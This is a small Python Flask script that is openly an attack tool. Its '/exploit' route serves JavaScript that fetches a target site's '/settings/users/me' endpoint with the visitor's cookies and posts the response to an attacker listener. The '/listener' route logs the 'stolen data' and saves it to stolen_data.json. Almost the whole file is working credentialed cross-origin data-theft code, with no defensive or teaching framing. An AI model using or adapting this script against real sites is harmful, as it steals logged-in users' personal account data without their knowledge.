from flask import Flask, request
import json

app = Flask(__name__)

@app.route('/exploit')
def exploit():
    return '''
<script>
    fetch('https://www.target.com/service/settings/users/me', {
      method: 'GET',
      credentials: 'include'
    })
    .then(response => response.json())
    .then(data => {
      // Send stolen data to attacker server
      fetch('https://127.0.0.1:8443/listener', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      });
    });
</script>
'''

@app.route('/listener', methods=['POST'])
def listener():
    try:
        # Get the stolen data from the request
        stolen_data = request.get_json()
        
        # Print the stolen data to console
        print("Received stolen data:")
        print(json.dumps(stolen_data, indent=2))
        
        # Save the stolen data to a file
        with open('stolen_data.json', 'a') as f:
            f.write(json.dumps(stolen_data) + '\n')
        
        return 'Data received', 200
    except Exception as e:
        print(f"Error processing request: {e}")
        return 'Error', 400

if __name__ == '__main__':
    app.run(port=8443, ssl_context=('localhost.pem', 'localhost-key.pem')) # generate self-signed certs using mkcert: mkcert localhost 127.0.0.1 ::1
